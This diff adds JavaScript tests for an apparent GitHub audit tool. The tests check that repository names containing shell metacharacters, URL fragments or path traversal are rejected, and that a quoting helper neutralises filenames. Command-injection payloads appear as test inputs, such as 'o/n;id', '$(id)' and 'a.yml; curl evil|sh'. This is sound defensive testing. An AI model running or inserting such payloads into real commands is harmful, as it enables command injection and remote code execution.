@@ -72,6 +72,8 @@ import {
   auditRepo,
   hasCaller,
   wfEscape,
+  assertRepoName,
+  shq,
 } from './audit-delivery.mjs';
 
 // ── helpers ──────────────────────────────────────────────────────────────────
@@ -2330,10 +2332,13 @@ test('onboardedAt: a caller that arrived by RENAME throws instead of dating onbo
   );
   await assert.rejects(() => onboardedAt(client, ONBOARD_CFG, 'somerepo'), /arrived by RENAME/);
   // The previous path is the actionable part: without it the operator cannot
-  // re-run to cover the earlier period, and the throw is just an obstacle.
+  // re-run to cover the earlier period, and the throw is just an obstacle. The
+  // quotes are asserted, not tolerated: this is a pasteable command carrying a
+  // filename from the AUDITED REPO, so unquoting it is a regression even though
+  // this fixture's filename is benign.
   await assert.rejects(
     () => onboardedAt(client, ONBOARD_CFG, 'somerepo'),
-    /--caller-path \.github\/workflows\/leaderboard\.yml/,
+    /--caller-path '\.github\/workflows\/leaderboard\.yml'/,
   );
 });
 
@@ -2426,7 +2431,7 @@ test('onboardedAt: the rename probe pages past the first COMMIT_FILES_CAP files'
   });
   await assert.rejects(
     () => onboardedAt(client, ONBOARD_CFG, 'somerepo'),
-    /--caller-path \.github\/workflows\/buried\.yml/,
+    /--caller-path '\.github\/workflows\/buried\.yml'/,
   );
 });
 
@@ -4747,4 +4752,177 @@ test('auditRepo: the closed-PR walk has NO early stop — the whole history is r
     `the closed-PR walk must pass no options — an early stop truncates the ` +
       `head-SHA collision guard. Got: ${JSON.stringify(pulls.slice(1))}`,
   );
+});
+
+// ── Round 13: a repo identifier is a URL path segment, not a string ───────────
+//
+// The class: every value this process interpolates into an authenticated API
+// path, plus the one value it interpolates into a command it tells an operator to
+// paste. A metacharacter in a path segment does not fail — the WHATWG parser
+// TRUNCATES at it and the request goes somewhere else, so two different probes
+// collapse onto one benign endpoint and a guard built to prevent a silent drop
+// passes while the drop happens. Measured with the parser itself:
+//
+//   /repos/o/guard#old/contents/.github/workflows/x.yml  ->  /repos/o/guard
+//   /repos/o/n?x/pulls                                   ->  /repos/o/n
+//   /repos/../x/pulls                                    ->  /x/pulls
+//
+// Both directions are covered below, because over-rejection fails as silently as
+// under-rejection here: a legitimate name refused is a repo dropped from the
+// fleet, which is the same false clean.
+
+const REJECTED_REPO_ARGS = [
+  // Every one of these was ACCEPTED before this round. Whitespace was the only
+  // thing the owner/name shape check rejected.
+  ['o/n;id', 'command separator'],
+  ['o/n$(id)', 'command substitution'],
+  ['o/n`id`', 'backtick substitution'],
+  ['o/n&&id', 'shell conjunction'],
+  ['o/guard#old', 'fragment — truncates the path at the repo, probes metadata'],
+  ['o/n?x', 'query — same truncation'],
+  ['../x', 'traversal in the owner position'],
+  ['o/..', 'traversal in the name position'],
+  ['o/.', 'single-dot path segment'],
+];
+
+for (const [arg, why] of REJECTED_REPO_ARGS) {
+  test(`parseArgs: --repo ${arg} is rejected (${why})`, () => {
+    assert.throws(
+      () => parseArgs(['--repo', arg], NOW),
+      /must be a GitHub login|repository name must be|repository name may not be|must be owner\/name/,
+      `${arg} must not reach an API path`,
+    );
+  });
+}
+
+test('parseArgs: a metacharacter in ANY --repos entry is rejected, not just the first', () => {
+  // The reproduction, at the layer that now stops it. Before this round
+  // `--repos guard#old,caeruleus` produced fleet ["caeruleus"] and a clean
+  // report: assertReadable got a 200 from the TRUNCATED metadata endpoint and
+  // passed, then hasCaller got the same 200, found no `.content`, and answered
+  // false. The explicitly named subject was removed by the very guard that
+  // exists to make removing a named subject impossible.
+  assert.throws(() => parseArgs(['--repos', 'guard#old,caeruleus'], NOW), /repository name must be/);
+  assert.throws(() => parseArgs(['--repos', 'caeruleus,guard#old'], NOW), /repository name must be/);
+  assert.throws(() => parseArgs(['--repos', 'guard?x'], NOW), /repository name must be/);
+  assert.throws(() => parseArgs(['--repos', 'guard,..'], NOW), /repository name may not be/);
+  assert.throws(() => parseArgs(['--repos', '.'], NOW), /repository name may not be/);
+});
+
+test('parseArgs: CONTROL — every real identifier this fleet uses still parses', () => {
+  // The half of the guard that fails silently. A validator that rejects a
+  // legitimate name drops that repo from the audit, and a repo absent from the
+  // fleet reports nothing at all — the same false clean the charset check exists
+  // to prevent. These are the actual names in use plus the full legal charset.
+  const cases = [
+    ['praetorian-inc/guard', 'praetorian-inc', ['guard']],
+    ['praetorian-inc/guard-core', 'praetorian-inc', ['guard-core']],
+    ['praetorian-inc/public-workflows', 'praetorian-inc', ['public-workflows']],
+    // `.` and `_` are legal in a repo name and MUST survive: `.github` is a real
+    // repository in this org, and a name-charset check that rejected a dot would
+    // silently exclude it.
+    ['praetorian-inc/a.b_c-1', 'praetorian-inc', ['a.b_c-1']],
+    ['praetorian-inc/.github', 'praetorian-inc', ['.github']],
+  ];
+  for (const [arg, owner, repos] of cases) {
+    const out = parseArgs(['--repo', arg], NOW);
+    assert.equal(out.owner, owner, arg);
+    assert.deepEqual(out.repos, repos, arg);
+  }
+  assert.deepEqual(parseArgs(['--repos', 'guard,caeruleus,nerva'], NOW).repos, [
+    'guard',
+    'caeruleus',
+    'nerva',
+  ]);
+  // The default owner must satisfy its own validator — a guard that rejects the
+  // shipped default breaks every invocation that passes no --repo at all.
+  assert.equal(parseArgs([], NOW).owner, 'praetorian-inc');
+});
+
+test('assertRepoName: the charset boundary in both directions', () => {
+  for (const ok of ['a', 'A9', 'guard-core', 'a.b_c-1', '.github', 'x'.repeat(100)]) {
+    assert.doesNotThrow(() => assertRepoName(ok), ok);
+  }
+  for (const bad of ['', 'a b', 'a/b', 'a#b', 'a?b', 'a%2fb', 'a:b', '..', '.', 'x'.repeat(101)]) {
+    assert.throws(() => assertRepoName(bad), /repository name/, JSON.stringify(bad));
+  }
+});
+
+test('resolveFleet: an out-of-charset name THROWS instead of dropping the repo', async () => {
+  // Both provenances, because the guard has to sit where the value meets the URL
+  // rather than at whichever entrance happened to be audited. The explicit branch
+  // would otherwise trust `parseArgs` to have run — true of the CLI and of no
+  // other caller of this exported function.
+  const client = {
+    gh: async () => ({ name: 'x' }),
+    ghPaged: async () => [{ name: 'guard#old' }, { name: 'caeruleus' }],
+  };
+  // Discovered fleet: a re-targeted probe here reads as "not onboarded".
+  await assert.rejects(
+    () => resolveFleet(client, { ...FLEET_CFG, repos: null }),
+    /repository name must be/,
+  );
+  // Explicitly named fleet: the drop this whole guard exists to prevent.
+  await assert.rejects(
+    () => resolveFleet(client, { ...FLEET_CFG, repos: ['guard#old', 'caeruleus'] }),
+    /repository name must be/,
+  );
+});
+
+test('resolveFleet: a hostile name never reaches the API at all', async () => {
+  // Ordering, not just presence. Validating AFTER the readable/caller probes
+  // would still throw — and would still have sent the re-targeted request first,
+  // which is what makes the 200 look like a pass. Mutant-visible: move the
+  // validation below the assertReadable loop and this reds while the test above
+  // stays green.
+  const urls = [];
+  const client = {
+    gh: async (u) => {
+      urls.push(u);
+      return { name: 'x' };
+    },
+    ghPaged: async (u) => {
+      urls.push(u);
+      return [];
+    },
+  };
+  await assert.rejects(
+    () => resolveFleet(client, { ...FLEET_CFG, repos: ['guard#old'] }),
+    /repository name must be/,
+  );
+  assert.deepEqual(urls, [], `no request may carry an unvalidated name. Sent: ${JSON.stringify(urls)}`);
+});
+
+test('resolveFleet: CONTROL — a legal fleet still resolves through the same path', async () => {
+  // Gives the four tests above their meaning: the rejections are caused by the
+  // names, not by the validation loop refusing everything.
+  const client = fleetClient({
+    guard: { readable: true, caller: true },
+    '.github': { readable: true, caller: true },
+    'a.b_c-1': { readable: true, caller: false },
+  });
+  assert.deepEqual(await resolveFleet(client, { ...FLEET_CFG, repos: ['guard', '.github', 'a.b_c-1'] }), [
+    'guard',
+    '.github',
+  ]);
+});
+
+test('shq: single-quote wrapping survives a quote in the value', () => {
+  // The rename remediation's filename comes from the AUDITED REPO, and the
+  // sentence it lands in is a command the report tells an operator to paste while
+  // responding to a false-clean alert. Quoted rather than validated on purpose: a
+  // filename is DATA, and refusing a weird-but-legal one would refuse to report
+  // the rename — the exact false clean that message exists to prevent.
+  assert.equal(shq('.github/workflows/a.yml'), `'.github/workflows/a.yml'`);
+  assert.equal(shq('a.yml; curl evil|sh'), `'a.yml; curl evil|sh'`);
+  assert.equal(shq('$(id)'), `'$(id)'`);
+  // The only character that can end the quoting, and the one an escape written
+  // from memory gets wrong: close, escape, reopen.
+  assert.equal(shq(`it's.yml`), `'it'\\''s.yml'`);
+  // Verified against the real interpreter rather than asserted from the shape:
+  // the payload must arrive as one inert argument.
+  for (const raw of [`it's.yml`, 'a.yml; id', '$(id)', '`id`', 'a b&&id']) {
+    const out = execFileSync('/bin/sh', ['-c', `printf '%s' ${shq(raw)}`], { encoding: 'utf8' });
+    assert.equal(out, raw, `shq must round-trip ${JSON.stringify(raw)} through sh`);
+  }
 });
